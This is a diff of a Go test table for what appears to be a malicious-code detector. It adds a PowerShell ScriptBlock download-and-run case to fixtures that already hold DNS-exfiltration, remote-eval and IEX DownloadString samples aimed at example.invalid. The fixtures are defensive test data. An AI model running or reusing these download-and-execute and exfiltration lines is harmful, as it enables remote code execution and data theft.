@@ -27,7 +27,7 @@ func TestStage14SchoolReportContextControls(t *testing.T) {
         {"python-dns-encoded-label","resolver.py",
            "import socket\nfor packet in packets:\n label=packet.hex()\n socket.gethostbyname(label + '.example.invalid')",true},
         {"js-scattered-ps-keywords","bundle.js",
-           "function one(){downloadfile('local.txt')}\n"+strings.Repeat("var unrelated = 7;\n",300)+"function two(){invoke_expression(42)}",false},
+           "function one(){downloadfile('local.txt')}\n"+strings.Repeat("var unrelated = 7;\n",300)+"function two(){invoke-expression(42)}",false},
         {"js-eval-remote-fetch","bundle.js",
            "eval(await fetch('https://example.invalid/demo').then(x=>x.text()))",true},
         {"html-separated-export-primitives","export.html",
@@ -43,6 +43,8 @@ func TestStage14SchoolReportContextControls(t *testing.T) {
         {"ps-dynamic-dns-signal-still-detected","dns.ps1","nslookup $chunk.example.invalid",true},
         {"ps-download-execute-still-detected","launcher.ps1",
            "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/inert')",true},
+        {"ps-scriptblock-downloaddata-still-detected","launcher.ps1",
+           "[ScriptBlock]::Create((New-Object Net.WebClient).DownloadData('https://example.invalid/inert'))",true},
         {"ps-quoted-example-benign","launcher.ps1",
            "Write-Host \"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/inert')\"",false},
     }
